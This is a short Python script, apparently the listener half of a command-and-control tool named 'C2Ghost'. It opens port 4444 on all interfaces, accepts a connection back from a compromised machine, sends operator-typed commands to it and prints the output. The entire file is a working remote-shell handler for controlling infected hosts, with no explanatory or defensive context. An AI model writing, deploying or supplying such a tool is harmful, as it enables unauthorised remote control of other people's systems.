#!/usr/bin/env python3

import socket
import os

# --- Configuration ---
BIND_IP = "0.0.0.0"  # Listen on all interfaces
BIND_PORT = 4444     # Change if needed

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((BIND_IP, BIND_PORT))
    server.listen(5)
    print(f"[+] C2Ghost Listener running on {BIND_IP}:{BIND_PORT}")

    client_socket, client_addr = server.accept()
    print(f"[+] Connection established from {client_addr[0]}:{client_addr[1]}")

    while True:
        command = input("C2Ghost>> ").strip()
        if command == "":
            continue
        client_socket.send(command.encode())

        if command.lower() == "exit":
            print("[*] Closing connection...")
            break

        response = client_socket.recv(4096).decode(errors="ignore")
        print(response)

    client_socket.close()
    server.close()

if __name__ == "__main__":
    try:
        start_listener()
    except KeyboardInterrupt:
        print("\n[!] Listener terminated.")
